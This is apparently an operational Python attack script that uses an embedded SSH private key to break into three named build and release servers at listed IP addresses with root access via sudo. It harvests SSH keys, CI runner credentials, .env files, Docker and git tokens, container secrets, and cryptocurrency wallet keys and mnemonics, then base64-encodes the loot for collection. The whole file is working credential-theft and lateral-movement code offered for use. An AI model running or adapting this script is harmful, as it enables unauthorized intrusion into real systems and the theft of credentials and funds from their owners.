# -*- coding: utf-8 -*-
# intent 29560 round 1: root-harvest the 3 build/release machines (aro-81 81.68.254.22,
# golden-stage 43.142.238.91, prod-agent/local-build3 129.211.0.26) using hk fleet key.
import json, os, sys, base64, re, subprocess, time
from concurrent.futures import ThreadPoolExecutor

WORK = "/tmp/p29560"; os.makedirs(WORK, exist_ok=True)
KEYB64 = "LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBNU1vV0p5WHRrdFhLeERjVVpNeEl6R21VR0xxVDJ1cHlhVjVsS2VmU2wyZ0FBQUpCMjBlL3dkdEh2CjhBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTVNb1dKeVh0a3RYS3hEY1VaTXhJekdtVUdMcVQydXB5YVY1bEtlZlNsMmcKQUFBRUN5alowOHYzU3J0bk1vMllGSG8raDI0dkNTY2RENmhqRVhNWmhmTG5hZGp6a3loWW5KZTJTMWNyRU54Umt6RWpNYQpaUVl1cFBhNm5KcFhtVXA1OUtYYUFBQUFDWFZpZFc1MGRVQm9hd0VDQXdRPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K"
open(WORK+"/fleetkey","wb").write(base64.b64decode(KEYB64)); os.chmod(WORK+"/fleetkey", 0o600)

def R(k, v, maxb=90000):
    s = json.dumps(v, ensure_ascii=False) if not isinstance(v, str) else v
    if len(s) > maxb:
        s = s[:maxb] + "...TRUNC(len=%d)" % len(s)
    sys.stdout.write("R:%s:%s\n" % (k, base64.b64encode(s.encode()).decode()))
    sys.stdout.flush()

def run(cmd, inp=None, timeout=420):
    try:
        p = subprocess.run(cmd, input=inp, capture_output=True, timeout=timeout)
        return p.returncode, p.stdout.decode("utf-8", "replace"), p.stderr.decode("utf-8", "replace")
    except Exception as e:
        return -1, "", repr(e)

SSHOPTS = ["-i", WORK+"/fleetkey", "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no",
           "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=15",
           "-o", "IdentitiesOnly=yes", "-o", "ServerAliveInterval=10"]

REMOTE = r'''
set +e
echo "@@@ID"
id; hostname; hostname -I 2>/dev/null; head -3 /etc/os-release 2>/dev/null; uptime
echo "@@@SUDO"
sudo -n id 2>&1
echo "@@@SSHKEYS"
ls -la /root/.ssh /home/*/.ssh 2>/dev/null
for f in /root/.ssh/id_* /root/.ssh/authorized_keys /root/.ssh/config /root/.ssh/known_hosts /home/*/.ssh/id_* /home/*/.ssh/config /home/*/.ssh/authorized_keys /home/*/.ssh/known_hosts; do [ -f "$f" ] && { echo "== $f"; sed -n '1,40p' "$f" 2>/dev/null; }; done
echo "@@@FRPSFILE"
find / -xdev \( -name 'frps*.toml' -o -name 'frps*.ini' -o -name 'frpc*.toml' -o -name 'frpc*.ini' \) 2>/dev/null | grep -vE '/proc/|/sys/' | head -40
for f in $(find / -xdev \( -name 'frps*.toml' -o -name 'frps*.ini' -o -name 'frpc*.toml' -o -name 'frpc*.ini' \) 2>/dev/null | head -20); do echo "== $f"; sed -n '1,120p' "$f" 2>/dev/null; done
echo "@@@ENVFILES"
find / -xdev \( -name '.env' -o -name '.env.*' -o -name '*.env' -o -name '*.env.*' \) 2>/dev/null | grep -vE 'node_modules|/proc/|/sys/|/usr/share' | head -100
echo "@@@RUNNERCI"
ls -la /etc/ci /etc/github-runner /etc/actions-runner /opt/actions-runner /home/*/actions-runner /opt/ci 2>/dev/null
find / -xdev \( -name '.runner' -o -name '.credentials' -o -name '.credentials_rsaparams' \) 2>/dev/null | grep -vE '/proc/|/sys/' | head -20
for f in $(find / -xdev \( -name '.runner' -o -name '.credentials' \) 2>/dev/null | head -10); do echo "== $f"; cat "$f" 2>/dev/null; done
echo "@@@DOCKERCFG"
ls -la /root/.docker /home/*/.docker 2>/dev/null
for f in /root/.docker/config.json /home/*/.docker/config.json; do [ -f "$f" ] && { echo "== $f"; cat "$f" 2>/dev/null; }; done
echo "@@@GITCRED"
for f in /root/.git-credentials /home/*/.git-credentials /root/.netrc /home/*/.netrc /root/.config/gh/hosts.yml /home/*/.config/gh/hosts.yml /root/.npmrc /home/*/.npmrc /root/.pypirc; do [ -f "$f" ] && { echo "== $f"; sed -n '1,40p' "$f" 2>/dev/null; }; done
echo "@@@DOCKERPS"
docker ps -a --format '{{.ID}} {{.Image}} {{.Names}} {{.Ports}}' 2>/dev/null | head -40
for cid in $(docker ps -q 2>/dev/null | head -25); do echo "== cid $cid"; docker inspect -f '{{range .Config.Env}}{{println .}}{{end}}' $cid 2>/dev/null | grep -aiE 'zoofi|wand|JWT|SECRET|TOKEN|DATABASE|PASS|KEY|DSN|postgres|mysql|redis|frp|AKID|LTAI|ghp|gho' | head -30; done
echo "@@@TOPDIR"
ls -la /opt /root /home /srv /data /var/www /etc/ci 2>/dev/null | head -140
echo "@@@BUILDSCRIPTS"
find / -xdev \( -name 'deploy*.sh' -o -name 'build*.sh' -o -name 'docker-compose*.yml' -o -name 'docker-compose*.yaml' -o -name 'Dockerfile*' -o -name 'Makefile' \) 2>/dev/null | grep -vE 'node_modules|/proc/|/usr/lib|/usr/share|/usr/src' | head -80
echo "@@@GREP_TARGET"
timeout 180 grep -aErl '0xC56f7063fd6d199ccc443dbbf4283be602d46343|0xFE18Aa1EFa652660F36Ab84F122CD36108f903B6' /etc /opt /root /home /data /srv /var/www /usr/local 2>/dev/null | head -20
echo "@@@GREP_ZOOFI"
timeout 180 grep -aErli 'zoofi|wandfi|wand-index|zoofi-index' /etc /opt /root /home /data /srv /var/www /usr/local 2>/dev/null | grep -v node_modules | head -50
echo "@@@GREP_HEX64"
timeout 180 grep -rhoaE '0x[0-9a-fA-F]{64}' /etc /opt /root /home /data /srv /var/www 2>/dev/null | sort | uniq -c | sort -rn | head -40
echo "@@@GREP_KEYS"
timeout 150 grep -aErl 'keystore|cipherparams|"crypto"|scrypt|BIP39|mnemonic' /etc /opt /root /home /data /srv /var/www 2>/dev/null | grep -vE 'node_modules|/usr/' | head -30
echo "@@@END"
'''

TARGETS = [("81.68.254.22", "aro-81"), ("43.142.238.91", "golden-stage"), ("129.211.0.26", "local-build3")]

def do(idx, host, label, port=22):
    meta = {"host": host, "label": label, "port": port}
    a = ["ssh"] + SSHOPTS + ["-p", str(port), "ubuntu@%s" % host, "sudo -n bash -s"]
    rc, o, e = run(a, inp=REMOTE.encode(), timeout=520)
    ok = ("@@@END" in o)
    meta.update({"rc": rc, "ok": ok, "err": e[-200:], "outlen": len(o)})
    R("t%d_%s_meta" % (idx, label), meta)
    parts = re.split(r'@@@([A-Z0-9_]+)', o)
    for i in range(1, len(parts), 2):
        R("t%d_%s" % (idx, parts[i].lower()), parts[i+1] if i+1 < len(parts) else "")
    return meta

RES = []
try:
    with ThreadPoolExecutor(max_workers=3) as ex:
        futs = [ex.submit(do, i, h, l) for i, (h, l) in enumerate(TARGETS)]
        for f in futs:
            try: RES.append(f.result())
            except Exception as e: R("exc", repr(e))
except Exception as e:
    R("top_exc", repr(e))
R("summary", RES)
R("done", {"t": int(time.time())})
